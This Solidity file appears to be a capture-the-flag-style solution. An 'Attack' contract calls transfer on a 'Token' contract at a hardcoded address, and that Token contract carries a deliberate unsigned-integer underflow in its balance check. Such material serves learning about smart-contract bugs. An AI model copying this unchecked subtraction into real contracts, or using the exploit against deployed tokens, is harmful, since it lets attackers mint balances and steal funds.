// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    
    Token token = Token(0x36F710158F337261836F058Da42150951037febe);

function total() public{
    token.totalSupply;
}

    function Transfer(address _to, uint _val) public {
token.transfer(_to, _val);
    }



}



contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}